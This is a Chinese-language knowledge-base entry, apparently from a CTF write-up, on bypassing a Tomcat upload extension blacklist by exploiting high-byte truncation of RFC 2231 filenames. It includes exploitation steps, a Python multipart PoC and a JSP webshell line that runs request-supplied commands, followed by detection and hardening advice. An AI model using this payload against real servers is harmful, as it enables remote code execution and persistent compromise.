---
id: web-java-component-tomcat-rfc2231-filename-char-truncation-jsp-upload
title: Tomcat RFC2231 文件名高位截断：filename*=UTF-8''sh.陪sp 绕过扩展名黑名单落盘 JSP
type: scenario
domain: web
path: web/java/component/tomcat
technique: tomcat-rfc2231-filename-char-truncation
aliases:
- Ghost Bits 文件上传
- Cast Attack 文件名截断
- filename* UTF-8'' 陪 sp
- Tomcat 扩展名黑名单绕过
- Java char 转 byte 高位丢弃
- sh.陪sp 上传 JSP
tags:
- java
- tomcat
- ghost-bits
- cast-attack
- file-upload
- rfc2231
- filename-truncation
- jsp
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: Apache Tomcat 9（原文靶场版本）
verification:
  verified_by: verifier-V108
  verified_at: '2026-11-05T22:36:05+08:00'
  notes: 对照 Web467 stage1：filename*=UTF-8''sh.陪sp、陪 U+966A 低字节 0x6A、扩展名黑名单绕过落盘 JSP 一致；未复跑
---

## 一句话结论

Tomcat 解码 multipart 的 `filename*=UTF-8''...` 时把 Java `char` 写入字节流，高 8 位被静默截断；构造文件名 `sh.陪sp`（“陪”U+966A 低字节 0x6A 即 `j`），扩展名校验看到的是 `sh.陪sp` 而落盘文件名变成 `sh.jsp`，从而绕过只匹配 `.jsp/.jspx/.jspf` 的上传黑名单并执行 JSP。

## 原理

- Java 的 `char` 是 16 位 Unicode，HTTP 报文和文件系统路径最终是 8 位字节。把 `char` 直接写进 `ByteArrayOutputStream.write(int)` 之类的字节流接口时，方法只保留低 8 位，高 8 位被静默丢弃——这就是 Ghost Bits / Cast Attack 的核心。
- RFC 2231 允许 multipart 用 `filename*=UTF-8''<百分号编码>` 传递非 ASCII 文件名。Tomcat 在解析该参数时按 UTF-8 解码出 Java 字符串，再逐字符写入字节缓冲区时发生截断。
- 汉字“陪”的码点是 U+966A，低 8 位是 0x6A，即 ASCII 的 `j`。上传文件名写成 `sh.陪sp` 时：
  - 业务过滤读到的是原始字符串 `sh.陪sp`，其中不含 `.jsp` 子串，放行；
  - Tomcat 落盘时把 `陪` 截断成 `j`，实际文件名为 `sh.jsp`，落在可执行目录即被当作 JSP 解析。
- 这是典型的“检查方与执行方解码不一致”：检查方按 Unicode 字符比较，执行方按截断后的低字节写文件。只要目标扩展名的任意字符（`j`、`s`、`p` 等）能由某个高位字符的低字节表示，就能构造出绕过串。

## 触发条件

- 使用存在该截断行为的 Tomcat/文件上传解析实现（原文环境为 Tomcat 9）。
- 上传接口按文件名的扩展名子串做黑名单（`.jsp`、`.jspx`、`.jspf` 等），而不是按落盘后的规范文件名做白名单。
- multipart 解析接受并优先采用 `filename*=UTF-8''...` 形式的文件名。
- 上传目录可由 Tomcat 解析 JSP（或存在其他可执行落点）；攻击者能访问上传后的文件。

## 利用步骤

1. 确认上传接口的扩展名过滤逻辑只匹配文件名字符串，且响应/回显能暴露落盘文件名或访问路径。
2. 选择目标扩展名（如 `.jsp`）中需要伪装的字符，查 Unicode 码点低 8 位等于该 ASCII 字符的字符。例如 `j`=0x6A 对应 `陪`(U+966A)，`s`=0x73 可用 U+9673 等，`p`=0x70 可用 U+9670 等。
3. 构造 multipart 字段：`Content-Disposition: form-data; name="file"; filename*=UTF-8''sh.陪sp`，正文为 JSP webshell。
4. 发送上传请求；过滤看到 `sh.陪sp` 放行，Tomcat 截断落盘为 `sh.jsp`。
5. 访问 `sh.jsp` 执行命令，读取 proof/flag 或建立持久化。

## PoC

```python
GHOST_J = "陪"          # U+966A 低字节 0x6A = 'j'
BND = "----ghostbits"
fname = "sh." + GHOST_J + "sp"   # 过滤看到 sh.陪sp，落盘 sh.jsp
part = (
    "--" + BND + "\r\n"
    "Content-Disposition: form-data; name=\"file\"; filename*=UTF-8''" + fname + "\r\n"
    "Content-Type: application/octet-stream\r\n\r\n" + SHELL +
    "\r\n--" + BND + "--\r\n"
).encode("utf-8")

http("POST", "/stage1/upload.jsp", part,
     {"Content-Type": "multipart/form-data; boundary=" + BND})
```

```jsp
<%-- SHELL 内容示例：Runtime.getRuntime().exec(request.getParameter("c")) --%>
```

## 变体与关联

- 变体：把 `.jsp` 中任意字符替换成低字节相同的汉字；也可伪装 `.war`、`.class`、`.xml` 等被黑名单拦截的扩展名。
- 变体：若落盘接口使用 `new String(bytes, charset)` 再写文件，截断点可能出现在另一次编码转换；审计所有 `char`→`byte`、`String`→`OutputStream` 的路径。
- 关联：[[web-java-framework-spring-ghost-bits-path-traversal]]（同一 Ghost Bits 原语在 Spring `uriDecode` 与 Jetty 路径解析上的利用）、[[web-generic-file-upload-weak-suffix-bypass]]（通用弱后缀绕过）。
- 边界：截断依赖具体解析实现；若 Tomcat 版本已修复或在落盘前用规范文件名做二次校验，则失效。上传目录不可执行时只能造成文件写入/覆盖。

## 检测与防御

- 检测：multipart 文件名中出现 `filename*=UTF-8''` 且含非 ASCII 字符；告警落盘文件名与请求文件名不一致、包含高位字符或截断后变成脚本扩展名；监控上传目录中新出现的 `.jsp/.jspx/.war`。
- 修复：按解码后的最终文件名做扩展名白名单，而不是对原始字符串做子串黑名单；拒绝文件名中的非 ASCII 字符、控制字符和多重扩展名；上传目录关闭脚本解析（Tomcat 侧禁用 JSP Servlet 或放到不可执行目录）。
- 加固：升级修复该截断行为的 Tomcat 版本；上传文件重命名为随机名并强制安全扩展名；对上传内容做类型检测；最小权限运行 Tomcat。
